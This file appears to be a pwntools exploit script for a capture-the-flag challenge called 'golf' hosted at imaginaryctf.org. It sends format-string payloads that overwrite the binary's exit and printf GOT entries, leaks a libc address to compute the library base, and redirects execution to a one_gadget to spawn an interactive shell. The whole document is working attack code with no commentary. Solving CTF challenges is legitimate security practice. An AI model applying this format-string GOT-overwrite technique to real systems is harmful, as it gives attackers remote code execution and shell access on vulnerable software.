#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

exe = ELF('./golf_patched')
libc = ELF('./libc.so.6')

host, port = "golf.chal.imaginaryctf.org", "1337"

while(True):
  if args.REMOTE:
    p = remote(host,port)
  else:
    p = process(exe.path)
  payload = '%*9$p%8$hn'+'\x00'*6+p64(exe.got['exit'])+p64(0x10d0)
  p.sendline(payload)
  p.recvuntil('0',drop=True)
  leak = int('0'+p.recv(13),16) 
  libc.address = leak - (0x00000000001ec980 + 131)

  low1 = libc.address & 0xffffffff
  if (((low1&0xff000000)>>24) > 0x05):
    p.close()
    print('.')
    continue
  print('leak = '+hex(leak))
  print('libc base = '+hex(libc.address))
  onegadgets = one_gadget('libc.so.6', libc.address)

  low1 = onegadgets[1] & 0xffffffff
  payload = '%*9$p%8$nX'+'\x00'*6+p64(exe.got['printf'])+p64(low1)

  p.sendline(payload)
  p.recvuntil('X',drop=True)
  print('got shell !')
  p.interactive()

p.interactive()

